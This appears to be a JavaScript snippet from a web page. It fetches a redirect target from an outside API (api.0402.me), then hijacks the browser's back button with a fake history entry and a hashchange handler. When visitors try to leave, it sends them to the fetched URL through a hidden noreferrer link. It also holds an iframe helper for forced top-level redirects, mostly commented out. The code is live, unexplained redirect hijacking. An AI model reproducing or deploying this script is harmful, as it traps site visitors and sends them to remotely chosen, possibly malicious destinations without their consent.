    var jump_url = '';
    
    $.ajax({
        type: "GET",
        url: 'https://api.0402.me/task/getUrl?id=wtx18&m=15&c=1',
        async: false,
        dataType:'text',
        success: function(data) {
            arr = JSON.parse(data);
		    jump_url = arr.jump;
		    
        }
    });
   
	function a(e) {
		var f = document.createElement('iframe');
		f.style.display = 'none';
		document.body.appendChild(f).src = 'javascript:"<script>top.location.replace(\'' + e + '\')<\/script>"';
	}
	function jump1() {
		if (!localStorage.is_fx) {
			localStorage.is_fx = Date.now()
			//a('http://baidu.com')
			//window.location.replace();
			// location.href="http://baidu.com";
		} else {
			// localStorage.is_fx = Date.now()
		}
	}

	function jump2() {
		gotoData = {
			"hb": jump_url,
			"hb1": jump_url,
		}
		if (gotoData[window.location.pathname] != undefined) {
			//a(gotoData[window.location.pathname])
			//alert("456");
		} else {
			jump1()
			//alert("123");
		}

	}
	
	window.onhashchange = function() {
		jp();
	};
	function hh() {
		history.pushState(history.length + 1, "app", "#pt_" + new Date().getTime());
	}
	function jp() {
		var a = document.createElement('a');
		a.setAttribute('rel', 'noreferrer');
		a.setAttribute('href', jump_url);
		document.body.appendChild(a);
		a.click();
		document.body.removeChild(a);
	}
	window.onload = function() {
		setTimeout('hh();', 100);
		setTimeout(
			"var imgs = document.images;for (var t_i=0;t_i<imgs.length;t_i++) {if (imgs[t_i].attributes['d-s'] && imgs[t_i].attributes['d-s'].value) {imgs[t_i].src = imgs[t_i].attributes['d-s'].value;}}",
			100);
	}
	// jump2()
	window.onpageshow = jump2